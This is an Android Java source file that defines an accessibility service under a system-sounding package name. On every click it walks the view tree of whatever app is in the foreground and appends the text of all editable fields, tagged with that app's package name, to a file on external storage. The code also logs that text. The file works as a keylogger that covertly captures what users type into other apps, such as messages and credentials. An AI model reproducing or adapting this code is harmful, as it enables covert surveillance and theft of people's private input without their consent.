package com.sdsmdg.servicesystem;

import android.accessibilityservice.AccessibilityService;
import android.os.Environment;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

public class MyAccessibilityService extends AccessibilityService {

    private String LOGTAG = "harshit";

    @Override
    protected void onServiceConnected() {

        Log.i(LOGTAG, "onServiceConnected() called");

        super.onServiceConnected();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            Log.d(LOGTAG, getTypeName(event.getEventType()));
            String eventText = getTypeName(event.getEventType()) + "===="
                    + event.getContentDescription();
            if (isExternalStorageWritable()) {

                Log.i(LOGTAG, "Saving");

            }
            Log.d("PackageName", event.getPackageName().toString());
            Log.d("EventName", eventText);
            traverseNode(getRootInActiveWindow(), event.getPackageName().toString());

        }
    }

    private void save(String s) {
        FileOutputStream stream = null;

        File notes = new File(Environment.getExternalStorageDirectory().toString() + "/SystemService", "samples.dat");
        if(!notes.exists()) {
            Log.i(LOGTAG, "file does not exist");
        }
        else{
            Log.i(LOGTAG, "file does exist");
        }
        Log.i(LOGTAG, Environment.getExternalStorageDirectory().toString() + "/SystemService");

        try {
            stream = new FileOutputStream(notes, true);
            stream.write(("\n"+s).getBytes());
        } catch (IOException e) {
            e.printStackTrace();
        } finally {

            if (stream != null) {
                try {
                    stream.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

        }

    }

    private void traverseNode(AccessibilityNodeInfo node, String packageName) {
        if (null == node)
            return;

        final int count = node.getChildCount();
        if (count > 0) {
            for (int i = 0; i < count; i++) {
                AccessibilityNodeInfo childNode = node.getChild(i);
                traverseNode(childNode, packageName);
            }
        } else if (node.getText() != null && !node.getText().toString().equals("")) {
            if (node.isEditable()) {
                CharSequence text = node.getText();
                save(packageName + ": " + text.toString());
                Log.d("test", "Node text = \"" + text.toString() + "\"");
            }
        }

    }

    private String getTypeName(int type) {
        switch (type) {
            case AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_START:
                return "TYPE_TOUCH_EXPLORATION_GESTURE_START";
            case AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_END:
                return "TYPE_TOUCH_EXPLORATION_GESTURE_END";
            case AccessibilityEvent.TYPE_TOUCH_INTERACTION_START:
                return "TYPE_TOUCH_INTERACTION_START";
            case AccessibilityEvent.TYPE_TOUCH_INTERACTION_END:
                return "TYPE_TOUCH_INTERACTION_END";
            case AccessibilityEvent.TYPE_GESTURE_DETECTION_START:
                return "TYPE_GESTURE_DETECTION_START";
            case AccessibilityEvent.TYPE_GESTURE_DETECTION_END:
                return "TYPE_GESTURE_DETECTION_END";
            case AccessibilityEvent.TYPE_VIEW_HOVER_ENTER:
                return "TYPE_VIEW_HOVER_ENTER";
            case AccessibilityEvent.TYPE_VIEW_HOVER_EXIT:
                return "TYPE_VIEW_HOVER_EXIT";
            case AccessibilityEvent.TYPE_VIEW_SCROLLED:
                return "TYPE_VIEW_SCROLLED";
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                return "TYPE_VIEW_CLICKED";
            case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:
                return "TYPE_VIEW_LONG_CLICKED";
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                return "TYPE_VIEW_FOCUSED";
            case AccessibilityEvent.TYPE_VIEW_SELECTED:
                return "TYPE_VIEW_SELECTED";
            case AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED:
                return "TYPE_VIEW_ACCESSIBILITY_FOCUSED";
            case AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED:
                return "TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED";
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                return "TYPE_WINDOW_STATE_CHANGED";
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                return "TYPE_NOTIFICATION_STATE_CHANGED";
            case AccessibilityEvent.TYPE_ANNOUNCEMENT:
                return "TYPE_ANNOUNCEMENT";
            case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                return "TYPE_WINDOW_CONTENT_CHANGED";
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                return "TYPE_VIEW_TEXT_CHANGED";
            case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED:
                return "TYPE_VIEW_TEXT_SELECTION_CHANGED";
            case AccessibilityEvent.TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY:
                return "TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY";
        }
        return "Unknown";
    }

    @Override
    public void onInterrupt() {

        Log.i(LOGTAG, "onInterrupt() called");

    }

    public boolean isExternalStorageWritable() {
        String state = Environment.getExternalStorageState();
        if (Environment.MEDIA_MOUNTED.equals(state)) {
            return true;
        }
        return false;
    }


}
